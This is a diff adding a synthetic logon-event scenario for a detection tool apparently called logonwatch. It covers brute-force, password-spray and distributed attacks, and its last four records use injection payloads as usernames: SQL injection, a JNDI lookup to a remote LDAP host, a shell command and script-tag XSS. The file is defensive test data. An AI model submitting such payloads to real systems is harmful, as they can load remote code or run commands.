@@ -1,0 +1,94 @@
+# logonwatch demo scenario, 2026-10-21 (UTC). All addresses are documentation ranges (RFC 5737).
+# Expected: success-after-failures, injection-attempt, brute-force, password-spray and distributed-attack alerts.
+{"time":"2026-10-21T08:00:00Z","outcome":"success","user":"alice","domain":"WORKSTATION","source":"192.0.2.10","logonType":3}
+{"time":"2026-10-21T08:30:00Z","outcome":"success","user":"DESKTOP-7$","domain":"WORKSTATION","source":"192.0.2.10","logonType":3}
+{"time":"2026-10-21T08:31:00Z","outcome":"success","user":"SYSTEM","domain":"WORKSTATION","source":"-","logonType":5}
+{"time":"2026-10-21T09:00:00Z","outcome":"failure","user":"bob","domain":"WORKSTATION","source":"-","logonType":2,"reason":"wrong password"}
+{"time":"2026-10-21T09:00:06Z","outcome":"failure","user":"bob","domain":"WORKSTATION","source":"-","logonType":2,"reason":"wrong password"}
+{"time":"2026-10-21T09:00:12Z","outcome":"success","user":"bob","domain":"WORKSTATION","source":"-","logonType":2}
+{"time":"2026-10-21T10:01:00Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:01:02Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:01:04Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:01:06Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:01:08Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:01:10Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:01:12Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:01:14Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:01:16Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:01:18Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:01:20Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:01:22Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:01:24Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:01:26Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:01:28Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:01:30Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:01:32Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:01:34Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:01:36Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:01:38Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:01:40Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:01:42Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:01:44Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:01:46Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:01:48Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:01:50Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:01:52Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:01:54Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:01:56Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:01:58Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:02:00Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:02:02Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:02:04Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:02:06Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:02:08Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:02:10Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:02:12Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:02:14Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:02:16Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:02:18Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:02:20Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:02:22Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:02:24Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:02:26Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:02:28Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:02:30Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:02:32Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:02:34Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:02:36Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:02:38Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:02:40Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:02:42Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:02:44Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:02:46Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:02:48Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:02:50Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:02:52Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:02:54Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:02:56Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:02:58Z","outcome":"failure","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10,"reason":"wrong password"}
+{"time":"2026-10-21T10:03:05Z","outcome":"success","user":"administrator","domain":"WORKSTATION","source":"203.0.113.7","logonType":10}
+{"time":"2026-10-21T11:00:00Z","outcome":"failure","user":"admin","domain":"WORKSTATION","source":"198.51.100.23","logonType":3,"reason":"wrong password"}
+{"time":"2026-10-21T11:00:20Z","outcome":"failure","user":"backup","domain":"WORKSTATION","source":"198.51.100.23","logonType":3,"reason":"wrong password"}
+{"time":"2026-10-21T11:00:40Z","outcome":"failure","user":"sql","domain":"WORKSTATION","source":"198.51.100.23","logonType":3,"reason":"user does not exist"}
+{"time":"2026-10-21T11:01:00Z","outcome":"failure","user":"guest","domain":"WORKSTATION","source":"198.51.100.23","logonType":3,"reason":"wrong password"}
+{"time":"2026-10-21T11:01:20Z","outcome":"failure","user":"test","domain":"WORKSTATION","source":"198.51.100.23","logonType":3,"reason":"user does not exist"}
+{"time":"2026-10-21T11:01:40Z","outcome":"failure","user":"support","domain":"WORKSTATION","source":"198.51.100.23","logonType":3,"reason":"user does not exist"}
+{"time":"2026-10-21T11:02:00Z","outcome":"failure","user":"scanner","domain":"WORKSTATION","source":"198.51.100.23","logonType":3,"reason":"user does not exist"}
+{"time":"2026-10-21T11:02:20Z","outcome":"failure","user":"web","domain":"WORKSTATION","source":"198.51.100.23","logonType":3,"reason":"user does not exist"}
+{"time":"2026-10-21T12:00:00Z","outcome":"success","user":"alice","domain":"WORKSTATION","source":"192.0.2.10","logonType":3}
+{"time":"2026-10-21T13:00:00Z","outcome":"failure","user":"backup","domain":"WORKSTATION","source":"192.0.2.101","logonType":3,"reason":"wrong password"}
+{"time":"2026-10-21T13:00:40Z","outcome":"failure","user":"backup","domain":"WORKSTATION","source":"192.0.2.102","logonType":3,"reason":"wrong password"}
+{"time":"2026-10-21T13:01:20Z","outcome":"failure","user":"backup","domain":"WORKSTATION","source":"192.0.2.103","logonType":3,"reason":"wrong password"}
+{"time":"2026-10-21T13:02:00Z","outcome":"failure","user":"backup","domain":"WORKSTATION","source":"192.0.2.104","logonType":3,"reason":"wrong password"}
+{"time":"2026-10-21T13:02:40Z","outcome":"failure","user":"backup","domain":"WORKSTATION","source":"192.0.2.105","logonType":3,"reason":"wrong password"}
+{"time":"2026-10-21T13:03:20Z","outcome":"failure","user":"backup","domain":"WORKSTATION","source":"192.0.2.106","logonType":3,"reason":"wrong password"}
+{"time":"2026-10-21T13:04:00Z","outcome":"failure","user":"backup","domain":"WORKSTATION","source":"192.0.2.101","logonType":3,"reason":"wrong password"}
+{"time":"2026-10-21T13:04:40Z","outcome":"failure","user":"backup","domain":"WORKSTATION","source":"192.0.2.102","logonType":3,"reason":"wrong password"}
+{"time":"2026-10-21T13:05:20Z","outcome":"failure","user":"backup","domain":"WORKSTATION","source":"192.0.2.103","logonType":3,"reason":"wrong password"}
+{"time":"2026-10-21T13:06:00Z","outcome":"failure","user":"backup","domain":"WORKSTATION","source":"192.0.2.104","logonType":3,"reason":"wrong password"}
+{"time":"2026-10-21T13:06:40Z","outcome":"failure","user":"backup","domain":"WORKSTATION","source":"192.0.2.105","logonType":3,"reason":"wrong password"}
+{"time":"2026-10-21T13:07:20Z","outcome":"failure","user":"backup","domain":"WORKSTATION","source":"192.0.2.106","logonType":3,"reason":"wrong password"}
+{"time":"2026-10-21T14:00:00Z","outcome":"failure","user":"admin' OR '1'='1","domain":"WORKSTATION","source":"192.0.2.66","logonType":3,"reason":"user does not exist"}
+{"time":"2026-10-21T14:00:15Z","outcome":"failure","user":"${jndi:ldap://198.51.100.9/a}","domain":"WORKSTATION","source":"192.0.2.66","logonType":3,"reason":"user does not exist"}
+{"time":"2026-10-21T14:00:30Z","outcome":"failure","user":"; whoami","domain":"WORKSTATION","source":"192.0.2.66","logonType":3,"reason":"user does not exist"}
+{"time":"2026-10-21T14:00:45Z","outcome":"failure","user":"<script>alert(1)</script>","domain":"WORKSTATION","source":"192.0.2.66","logonType":3,"reason":"user does not exist"}
